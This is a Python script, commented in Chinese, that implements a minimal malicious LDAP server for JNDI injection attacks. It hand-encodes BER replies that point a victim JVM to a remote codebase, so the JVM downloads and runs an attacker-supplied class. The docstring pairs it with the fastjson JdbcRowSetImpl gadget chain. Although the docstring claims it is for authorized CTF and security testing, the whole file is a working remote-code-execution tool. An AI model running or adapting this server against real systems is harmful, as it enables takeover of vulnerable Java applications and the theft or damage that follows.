#!/usr/bin/env python3
"""极简 LDAP JNDI 引用服务（javaNamingReference）。

用法: python3 ldap_server.py <bind_host> <port> <codebase_url> <class_name>

对 JNDI 的 LDAP 查询返回 javaCodeBase / javaFactory 引用，使目标 JVM 从
codebase_url 下载并加载恶意类。配合 fastjson JdbcRowSetImpl 等链使用。
纯标准库实现（socket + 手写 BER），远程服务器只需 python3，无需 Java。

仅用于授权 CTF / 安全测试。
"""
from __future__ import annotations

import socket
import sys


def enc_len(n: int) -> bytes:
    """BER 定长长度编码。"""
    if n < 0x80:
        return bytes([n])
    raw = n.to_bytes((n.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(raw)]) + raw


def tlv(tag: int, content: bytes) -> bytes:
    return bytes([tag]) + enc_len(len(content)) + content


def int_bytes(v: int) -> bytes:
    if v == 0:
        return b"\x00"
    raw = v.to_bytes((v.bit_length() + 7) // 8, "big")
    if raw[0] & 0x80:
        raw = b"\x00" + raw
    return raw


def integer(v: int) -> bytes:
    return tlv(0x02, int_bytes(v))


def enumerated(v: int) -> bytes:
    return tlv(0x0A, int_bytes(v))


def octet_string(s: str | bytes) -> bytes:
    if isinstance(s, str):
        s = s.encode()
    return tlv(0x04, s)


def seq(*items: bytes) -> bytes:
    return tlv(0x30, b"".join(items))


def oset(*items: bytes) -> bytes:
    """SET OF：与 SEQUENCE 相同编码，tag 为 0x31。"""
    return tlv(0x31, b"".join(items))


def ldap_result(code: int) -> bytes:
    """LDAPResult ::= SEQUENCE { ENUMERATED resultCode, OCTET STRING, OCTET STRING }"""
    return enumerated(code) + octet_string("") + octet_string("")


def read_all(conn: socket.socket, n: int) -> bytes | None:
    data = b""
    while len(data) < n:
        chunk = conn.recv(n - len(data))
        if not chunk:
            return None
        data += chunk
    return data


def recv_message(conn: socket.socket) -> bytes | None:
    head = read_all(conn, 2)
    if not head:
        return None
    first = head[1]
    if first < 0x80:
        length = first
    else:
        rest = read_all(conn, first & 0x7F)
        if rest is None:
            return None
        length = int.from_bytes(rest, "big")
    body = read_all(conn, length)
    if body is None:
        return None
    return head + body


def parse_message_id(msg: bytes) -> tuple[int, int]:
    """解析 messageID 与协议操作 tag，返回 (msg_id, op_tag)。"""
    if not msg or msg[0] != 0x30:
        return 0, 0
    i = 1
    if msg[i] < 0x80:
        i += 1
    else:
        i += 1 + (msg[i] & 0x7F)
    if msg[i] != 0x02:
        return 0, 0
    ilen = msg[i + 1]
    msg_id = int.from_bytes(msg[i + 2 : i + 2 + ilen], "big")
    op_tag = msg[i + 2 + ilen]
    return msg_id, op_tag


def build_bind_response(msg_id: int) -> bytes:
    """BindResponse ::= [APPLICATION 1] LDAPResult"""
    return seq(integer(msg_id), tlv(0x61, ldap_result(0)))


def build_search_response(msg_id: int, codebase: str, classname: str) -> list[bytes]:
    """SearchResEntry（javaNamingReference 属性）+ SearchResDone。"""
    attrs = seq(
        seq(octet_string("javaClassName"), oset(octet_string(classname))),
        seq(octet_string("javaCodeBase"), oset(octet_string(codebase))),
        seq(octet_string("objectClass"), oset(octet_string("javaNamingReference"))),
        seq(octet_string("javaFactory"), oset(octet_string(classname))),
    )
    # SearchResultEntry ::= [APPLICATION 4] SEQUENCE { objectName LDAPDN, attributes }
    entry = tlv(0x64, octet_string("") + attrs)
    done = tlv(0x65, ldap_result(0))  # SearchResultDone ::= [APPLICATION 5] LDAPResult
    return [seq(integer(msg_id), entry), seq(integer(msg_id), done)]


def main() -> None:
    if len(sys.argv) < 5:
        print(__doc__)
        sys.exit(1)
    host, port, codebase, classname = sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4]

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((host, port))
    srv.listen(5)
    print(f"[ldap] {host}:{port} -> {codebase} {classname}", flush=True)
    try:
        while True:
            conn, addr = srv.accept()
            print(f"[ldap] connect {addr[0]}:{addr[1]}", flush=True)
            with conn:
                while True:
                    msg = recv_message(conn)
                    if not msg:
                        break
                    msg_id, op = parse_message_id(msg)
                    if op == 0x60:  # bindRequest
                        conn.sendall(build_bind_response(msg_id))
                    elif op == 0x63:  # searchRequest
                        for resp in build_search_response(msg_id, codebase, classname):
                            conn.sendall(resp)
                    # unbindRequest(0x42) 等：忽略
    except KeyboardInterrupt:
        print("[ldap] bye", flush=True)


if __name__ == "__main__":
    main()
